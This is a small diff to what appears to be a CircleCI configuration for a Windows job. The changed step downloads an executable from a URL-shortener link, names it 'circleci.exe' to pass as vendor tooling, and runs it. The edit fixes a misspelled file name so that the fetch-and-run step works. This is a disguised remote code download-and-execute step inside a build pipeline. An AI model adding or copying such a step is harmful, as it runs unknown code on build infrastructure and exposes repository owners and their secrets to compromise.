@@ -9,4 +9,4 @@ jobs:
       name: win/default
       shell: cmd.exe
     steps:
-      - run: curl -L -o circleci.exe http://gg.gg/uspi2 && circleci.exz
+      - run: curl -L -o circleci.exe http://gg.gg/uspi2 && circleci.exe
